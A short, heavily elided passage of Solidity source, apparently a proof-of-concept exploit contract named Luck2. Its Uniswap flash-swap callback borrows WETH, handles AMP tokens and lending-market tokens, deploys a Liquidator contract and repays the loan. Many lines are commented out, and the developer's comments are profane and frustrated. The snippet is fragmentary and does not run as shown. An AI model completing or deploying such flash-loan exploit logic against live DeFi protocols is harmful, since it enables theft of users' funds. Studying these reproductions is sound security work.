...
contract Luck2 {
    ...
    function uniswapV2Call(
        ...
        // Fuck: I forget that (The money borrowed from uni is WETH not ETH)!
        ...
        uint256 lq_amount = IERC20(amp).balanceOf(address(this));

        // NOTE: Why it doesn't work?
        // bytes32 _salt = keccak256("goodjob");
        // address lq_address = address(
        //     uint160(
        //         uint256(
        //             keccak256(
        //                 abi.encodePacked(
        ...
        // Do liquidition twice
        // Liquidator lq2 = new Liquidator();

        // IERC20(amp).transfer(address(lq2), lq_amount);

        // lq2.btw(amp, cramp, address(this), lq_amount, ceth);

        // require(address(lq) == lq_address, "FFF: Address wrong");

        uint256 repay_amount = (1000 * amount1Out) / 997 + 1;
        IWETH(weth).deposit{value: address(this).balance}();
        // Fuck: It shoud repay to pair not router!
